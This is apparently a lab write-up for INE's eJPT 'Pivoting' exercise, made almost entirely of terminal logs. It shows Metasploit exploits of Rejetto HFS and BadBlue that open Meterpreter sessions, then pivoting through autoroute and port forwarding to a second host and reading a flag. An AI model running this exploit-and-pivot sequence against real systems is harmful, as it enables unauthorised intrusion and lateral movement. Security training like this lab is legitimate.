```jsx
Lab Name: Pivoting
Platform: INE
Lab No: 28
Exam: eJPT (Jr. Penetartion Tester)
```

## Pinging:

```console
┌──(root㉿INE)-[~]
└─# ping -c 4 demo1.ine.local
PING demo1.ine.local (10.4.17.4) 56(84) bytes of data.
64 bytes from demo1.ine.local (10.4.17.4): icmp_seq=1 ttl=125 time=10.4 ms
64 bytes from demo1.ine.local (10.4.17.4): icmp_seq=2 ttl=125 time=9.34 ms
64 bytes from demo1.ine.local (10.4.17.4): icmp_seq=3 ttl=125 time=10.5 ms
64 bytes from demo1.ine.local (10.4.17.4): icmp_seq=4 ttl=125 time=9.29 ms

--- demo1.ine.local ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3005ms
rtt min/avg/max/mdev = 9.289/9.900/10.543/0.588 ms

┌──(root㉿INE)-[~]
└─# ping -c 4 demo2.ine.local
PING demo2.ine.local (10.4.30.185) 56(84) bytes of data.
^C
--- demo2.ine.local ping statistics ---
4 packets transmitted, 0 received, 100% packet loss, time 3055ms
```

## NMAP Scan:

```console
┌──(root㉿INE)-[~]
└─# nmap -sV -O demo1.ine.local
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-22 15:27 IST
Nmap scan report for demo1.ine.local (10.4.17.4)
Host is up (0.0093s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               HttpFileServer httpd 2.3
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=9/22%OT=80%CT=1%CU=31566%PV=Y%DS=3%DC=I%G=Y%TM=66EF
OS:EA45%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10C%TI=I%CI=I%II=I%SS=S%
OS:TS=7)OPS(O1=M546NW8ST11%O2=M546NW8ST11%O3=M546NW8NNT11%O4=M546NW8ST11%O5
OS:=M546NW8ST11%O6=M546ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=
OS:2000)ECN(R=Y%DF=Y%T=7F%W=2000%O=M546NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=7F%S=O%
OS:A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=7F%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF
OS:=Y%T=7F%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=7F%W=0%S=A%A=O%F=R%O=%
OS:RD=0%Q=)T5(R=Y%DF=Y%T=7F%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=7F%W
OS:=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=7F%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
OS:U1(R=Y%DF=N%T=7F%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%D
OS:FI=N%T=7F%CD=Z)

Network Distance: 3 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.91 seconds
```

## Exploitation:

```console
msf6 > search rejetto

Matching Modules
================

   #  Name                                   Disclosure Date  Rank       Check  Description
   -  ----                                   ---------------  ----       -----  -----------
   0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/http/rejetto_hfs_exec

msf6 > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS demo1.ine.local
RHOSTS => demo1.ine.local
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

[*] Started reverse TCP handler on 10.10.42.2:4444 
[*] Using URL: http://10.10.42.2:8080/jYYeZTfHRGUuCFp
[*] Server started.
[*] Sending a malicious request to /
[*] Payload request received: /jYYeZTfHRGUuCFp
[*] Sending stage (176198 bytes) to 10.4.17.4
[!] Tried to delete %TEMP%\EtmIkkwPo.vbs, unknown result
[*] Meterpreter session 1 opened (10.10.42.2:4444 -> 10.4.17.4:49257) at 2024-09-22 15:31:42 +0530
[*] Server stopped.

meterpreter > sysinfo
Computer        : WIN-OMCNBKR66MN
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > getuid
Server username: WIN-OMCNBKR66MN\Administrator
```

## Pivoting:

```console
meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 14
============
Name         : Microsoft ISATAP Adapter
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280
IPv6 Address : fe80::5efe:a04:1104
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 21
============
Name         : Amazon Elastic Network Adapter
Hardware MAC : 0e:1c:bb:0e:6e:01
MTU          : 1500
IPv4 Address : 10.4.17.4
IPv4 Netmask : 255.255.240.0
IPv6 Address : fe80::5823:38a:e8cb:3e96
IPv6 Netmask : ffff:ffff:ffff:ffff::
```

## Adding Route:

```console
meterpreter > run autoroute -s 10.4.17.4/20

[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
[!] Example: run post/multi/manage/autoroute OPTION=value [...]
[*] Adding a route to 10.4.17.4/255.255.240.0...
[+] Added route to 10.4.17.4/255.255.240.0 via 10.4.17.4
[*] Use the -p option to list all active routes
```

## Pinging Second Machine:

```console
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(windows/http/rejetto_hfs_exec) > search portscan tcp

Matching Modules
================

   #  Name                                  Disclosure Date  Rank    Check  Description
   -  ----                                  ---------------  ----    -----  -----------
   0  auxiliary/scanner/portscan/ftpbounce  .                normal  No     FTP Bounce Port Scanner
   1  auxiliary/scanner/portscan/xmas       .                normal  No     TCP "XMas" Port Scanner
   2  auxiliary/scanner/portscan/ack        .                normal  No     TCP ACK Firewall Scanner
   3  auxiliary/scanner/portscan/tcp        .                normal  No     TCP Port Scanner
   4  auxiliary/scanner/portscan/syn        .                normal  No     TCP SYN Port Scanner


Interact with a module by name or index. For example info 4, use 4 or use auxiliary/scanner/portscan/syn

msf6 exploit(windows/http/rejetto_hfs_exec) > use 3
msf6 auxiliary(scanner/portscan/tcp) > set RHOSTS demo2.ine.local
RHOSTS => demo2.ine.local
msf6 auxiliary(scanner/portscan/tcp) > set PORTS 1-100
PORTS => 1-100
msf6 auxiliary(scanner/portscan/tcp) > run

[+] 10.4.30.185:          - 10.4.30.185:80 - TCP OPEN
[*] demo2.ine.local:      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

## Port Forwarding:

```console
msf6 auxiliary(scanner/portscan/tcp) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > portfwd add -l 1234 -p 80 -r demo2.ine.local
[*] Forward TCP relay created: (local) :1234 -> (remote) demo2.ine.local:80
meterpreter > portfwd list

Active Port Forwards
====================

   Index  Local         Remote              Direction
   -----  -----         ------              ---------
   1      0.0.0.0:1234  demo2.ine.local:80  Forward

1 total active port forwards.
```

## Exploiting Machine 2:

```console
┌──(root㉿INE)-[~]
└─# nmap -sV -p 1234 localhost
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-22 15:42 IST
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000078s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE    VERSION
1234/tcp open  tcpwrapped

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
```

```console
meterpreter > background
[*] Backgrounding session 1...
msf6 auxiliary(scanner/portscan/tcp) > search badblue 

Matching Modules
================

   #  Name                                       Disclosure Date  Rank   Check  Description
   -  ----                                       ---------------  ----   -----  -----------
   0  exploit/windows/http/badblue_ext_overflow  2003-04-20       great  Yes    BadBlue 2.5 EXT.dll Buffer Overflow
   1  exploit/windows/http/badblue_passthru      2007-12-10       great  No     BadBlue 2.72b PassThru Buffer Overflow
   2    \_ target: BadBlue EE 2.7 Universal      .                .      .      .
   3    \_ target: BadBlue 2.72b Universal       .                .      .      .


Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/http/badblue_passthru
After interacting with a module you can manually set a TARGET with set TARGET 'BadBlue 2.72b Universal'

msf6 auxiliary(scanner/portscan/tcp) > use 2
[*] Additionally setting TARGET => BadBlue EE 2.7 Universal
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/badblue_passthru) > use 1
[*] Using configured payload windows/meterpreter/reverse_tcp
msf6 exploit(windows/http/badblue_passthru) > set payload windows/meterpreter/bind_tcp
payload => windows/meterpreter/bind_tcp
msf6 exploit(windows/http/badblue_passthru) > set RHOSTS demo2.ine.local
RHOSTS => demo2.ine.local
msf6 exploit(windows/http/badblue_passthru) > exploit

[*] Trying target BadBlue EE 2.7 Universal...
[*] Started bind TCP handler against 10.4.30.185:4444
[*] Sending stage (176198 bytes) to 10.4.30.185
[*] Meterpreter session 2 opened (10.4.17.4:49411 -> 10.4.30.185:4444 via session 1) at 2024-09-22 15:46:08 +0530

meterpreter > sysinfo
Computer        : ATTACKDEFENSE
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

## Finding Flag:

```console
meterpreter > shell
Process 932 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1457]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\BadBlue\EE>cd /
cd /

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 9E32-0E96

 Directory of C:\

11/14/2018  06:56 AM    <DIR>          EFI
04/07/2021  08:03 AM                32 flag.txt
05/13/2020  05:58 PM    <DIR>          PerfLogs
11/07/2020  07:47 AM    <DIR>          Program Files
04/07/2021  08:01 AM    <DIR>          Program Files (x86)
11/07/2020  08:15 AM    <DIR>          Users
11/07/2020  12:42 AM    <DIR>          Windows
               1 File(s)             32 bytes
               6 Dir(s)  16,012,820,480 bytes free

C:\>type flag.txt
type flag.txt
c46d12f28d87ae0b92b05ebd9fb8e817
```
